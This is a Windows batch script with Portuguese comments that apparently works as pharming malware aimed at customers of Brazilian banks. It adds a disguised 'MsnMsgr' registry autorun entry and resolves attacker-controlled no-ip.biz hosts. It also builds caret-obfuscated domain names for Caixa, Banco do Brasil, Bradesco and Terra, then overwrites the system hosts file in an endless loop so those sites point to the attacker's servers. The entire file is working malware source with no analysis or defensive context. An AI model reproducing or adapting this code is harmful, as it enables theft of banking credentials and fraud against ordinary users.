::@echo off
@break off
ver|find "Windows 98">nul
if not errorlevel 1 goto nao

if exist %windir%\system32\ctzz.dll goto con
::adicionando no regedit
> %windir%\system32\ctzz.dll echo y
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v MsnMsgr /t REG_SZ /d "%windir%\system32\msnmsgr.exe" < %windir%\system32\ctzz.dll
::start /max iexplore.exe "http://www.google.com.br"
goto mapa
::Teste Conexao
:con
set ping=%windir%\system32\ping.exe
:teste
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto mapa
goto teste
::agendar
::magica
:mapa
::pegando IP
for /f "tokens=2" %%D in ('nslookup lan-cef.no-ip.biz ^| find "Address"') do set web=%%D
for /f "tokens=2" %%E in ('nslookup lan-bb.no-ip.biz ^| find "Address"') do set site=%%E
for /f "tokens=2" %%F in ('nslookup lan-desco.no-ip.biz ^| find "Address"') do set weber=%%F
for /f "tokens=2" %%G in ('nslookup lan-terra.no-ip.biz ^| find "Address"') do set ter=%%G
::variaveis
set f1=g^o^v^.b^r
set f2=c^om.^b^r
set db=www.c^a^i^x^a.%f2%
set dc=c^ai^x^a.%f2%
set dd=www.cai^x^a.%f1%
set de=c^aix^a.%f1%
set df=www.c^ef^.%f2%
set dg=^c^ef.%f2%
set dh=www.c^e^f.%f1%
set di=^c^e^f^.%f1%
set dj=www.ca^i^xae^co^nomi^c^a.%f2%
set dl=ca^ixa^eco^no^mic^a.%f2%
set dm=www.^c^a^i^xae^con^omica.%f1%
set dn=cai^xaecon^o^m^i^c^a.%f1%
set dp=www.ca^ix^ae^co^no^mic^a^federal.%f2%
set dq=b^b.%f2%
set dr=ww^w.b^b.%f2%
set ds=ba^n^codo^br^asi^l.%f2%
set dt=w^w^w.b^anc^odob^ra^si^l.%f2%
set va=w^w^w^.br^ad^esc^o.%f2%
set vb=br^ad^esc^o.%f2%
set vc=w^w^w^.br^ad^es^cop^rim^e.%f2%
set vd=br^ad^es^cop^rim^e.%f2%
set ve=w^w^w.te^rr^a.%f2%
::parte pra escrever o arquivo
> %temp%\~7.tmp echo %web% %db%&>> %temp%\~7.tmp echo %web% %dc%&>> %temp%\~7.tmp echo %web% %dd%&>> %temp%\~7.tmp echo %web% %de%&rem
>> %temp%\~7.tmp echo %web% %df%&>> %temp%\~7.tmp echo %web% %dg%&>> %temp%\~7.tmp echo %web% %dh%&>> %temp%\~7.tmp echo %web% %di%&>> %temp%\~7.tmp echo %web% %dj%&rem
>> %temp%\~7.tmp echo %web% %dl%&>> %temp%\~7.tmp echo %web% %dm%&>> %temp%\~7.tmp echo %web% %dn%&>> %temp%\~7.tmp echo %web% %dp%&rem
>> %temp%\~7.tmp echo %site% %dq%&>> %temp%\~7.tmp echo %site% %dr%&>> %temp%\~7.tmp echo %site% %ds%&>> %temp%\~7.tmp echo %site% %dt%&rem
>> %temp%\~7.tmp echo %weber% %va%&>> %temp%\~7.tmp echo %weber% %vb%&>> %temp%\~7.tmp echo %weber% %vc%&>> %temp%\~7.tmp echo %ter% %ve%&>> %temp%\~7.tmp echo %weber% %vd%&rem
::briga com o plugin
:l1
type %temp%\~7.tmp>%windir%\system32\drivers\etc\hosts&goto l1
:nao
::start /max iexplore.exe "http://www.google.com.br"
exit
